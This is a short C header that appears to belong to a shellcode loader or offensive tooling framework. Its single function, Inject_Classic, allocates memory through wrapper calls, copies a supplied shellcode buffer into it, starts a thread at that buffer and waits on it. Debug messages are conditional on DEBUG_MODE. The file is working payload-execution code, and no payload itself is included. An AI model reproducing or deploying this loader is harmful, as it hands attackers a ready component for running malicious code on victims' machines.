#pragma once
#include <windows.h>
#include <core/utils.h>
#include <api/api_wrappers.h>


void Inject_Classic(unsigned char* shellcode, int shellcode_len) {

    #ifdef DEBUG_MODE
        char debug_buffer[256];

    #endif

    // 1. Allocate memory
    DEBUG_MSG("Inject_Classic", "Allocate memory");
    LPVOID mem = MyVirtualAlloc(shellcode_len);
    if (mem == NULL) {
        DEBUG_MSG("Inject_Classic Error", "MyVirtualAlloc failed.");
        return;
    }

    // 2. Copy shellcode
    DEBUG_MSG("Inject_Classic", "Copy shellcode");
    RtlMoveMemory(mem, shellcode, shellcode_len);
    
    // 3. Create thread
    DEBUG_MSG("Inject_Classic", "Create thread");
    HANDLE thread = MyCreateThread(mem);
    if (thread == NULL) {
        VirtualFree(mem, 0, MEM_RELEASE);
        DEBUG_MSG("Inject_Classic Error", "MyCreateThread failed.");
        return;
    }
        
    // 4. Wait for thread
    MyWaitForSingleObject(thread);

}